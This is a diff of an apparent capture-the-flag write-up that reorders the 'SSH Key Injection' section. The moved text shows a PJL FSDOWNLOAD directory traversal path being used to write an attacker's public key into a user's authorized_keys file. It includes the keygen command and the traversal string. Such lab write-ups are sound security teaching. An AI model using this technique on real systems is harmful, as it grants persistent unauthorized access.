@@ -467,6 +467,32 @@ Because the same vulnerable path translation was used, directory traversal could
 
 # 13. SSH Key Injection
 
+On Kali I generated a fresh Ed25519 key pair:
+
+```bash
+ssh-keygen -t ed25519 -f ~/paperwork_key -N ''
+```
+
+The public key was written into:
+
+```text
+/home/archivist/.ssh/authorized_keys
+```
+
+using the traversal path:
+
+```text
+0:/../../../home/archivist/.ssh/authorized_keys
+```
+
+The write operation returned:
+
+```text
+OK
+```
+
+I then verified the file through PJL and confirmed that the public key had been written successfully.
+
 After discovering /home/archivist/.ssh/authorized_keys, I used the PJL filesystem write functionality to add my own SSH public key to the file.
 
 The jetdirect.py source showed that the FSDOWNLOAD command writes attacker-controlled data to an arbitrary filesystem path:
@@ -524,32 +550,6 @@ was resolved by the vulnerable path handling to:
 This allowed me to append my SSH public key to archivist's authorized_keys file.
 
 After the key was written, I could authenticate to the target as archivist using the corresponding private key.
-
-On Kali I generated a fresh Ed25519 key pair:
-
-```bash
-ssh-keygen -t ed25519 -f ~/paperwork_key -N ''
-```
-
-The public key was written into:
-
-```text
-/home/archivist/.ssh/authorized_keys
-```
-
-using the traversal path:
-
-```text
-0:/../../../home/archivist/.ssh/authorized_keys
-```
-
-The write operation returned:
-
-```text
-OK
-```
-
-I then verified the file through PJL and confirmed that the public key had been written successfully.
 
 ---
 
